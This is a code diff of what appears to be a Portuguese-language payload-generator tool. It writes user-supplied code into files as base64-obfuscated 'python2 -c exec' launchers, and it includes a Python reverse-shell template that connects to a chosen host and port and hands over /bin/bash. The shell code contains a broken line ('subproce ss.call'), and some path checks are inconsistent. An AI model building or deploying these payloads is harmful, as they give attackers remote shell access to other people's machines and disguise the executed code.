@@ -6,7 +6,7 @@ import os
 def payloads():
     def custon_payload():
         try:
-            os.makedirs("../../../..payloads/custon")
+            os.makedirs("payloads/custon")
             print("[criando pasta Payloads][OK]")
 
         except OSError as exc:
@@ -18,14 +18,16 @@ def payloads():
         nome = input("[+]nome=>")
         prg = input("[+]extencao=>")
         print("[escreva o seu  custon payload]")
-        code = input(""" """)
-        with open(nome, "w") as pay:
+        full = nome + "." + prg
+        code = input("""""")
+        with open("payloads/custon/" + nome + "." + prg, "w") as pay:
             dsa = base64.b64encode(bytes(code, 'utf-8'))
             payload_base64 = (str(dsa)[2:-1])
             pay.write('python2 -c "exec(' + "'" + payload_base64 + "'.decode('base64'))" + '"')
             pay.close()
-            if os.path.exists("../../../../payloads/custon/%s" + "." + "%s" % (nome, prg)) == True:
-                print("../../../../payloads/custon/%s" + "." + "%s" % (nome, prg))
+            if os.path.exists("/payloads/custon/%s" % full) == False:
+                print("[+]payload gerado com sucesso[+]")
+                print("[+]/payloads/custon/%s" % full)
 
 
 
@@ -49,13 +51,13 @@ def payloads():
         port = input("[+]port_payload=>")
         with open("../../../payloads/python_Base64.py", "w") as pay:
             payload = ("""
-    import socket, subprocess, os
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((%s,%s))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    p = subproce ss.call("/bin/bash")
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((%s,%s))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subproce ss.call("/bin/bash")
             """ % (host, port))
             dsa = base64.b64encode(bytes(payload, 'utf-8'))
             payload_base64 = (str(dsa)[2:-1])
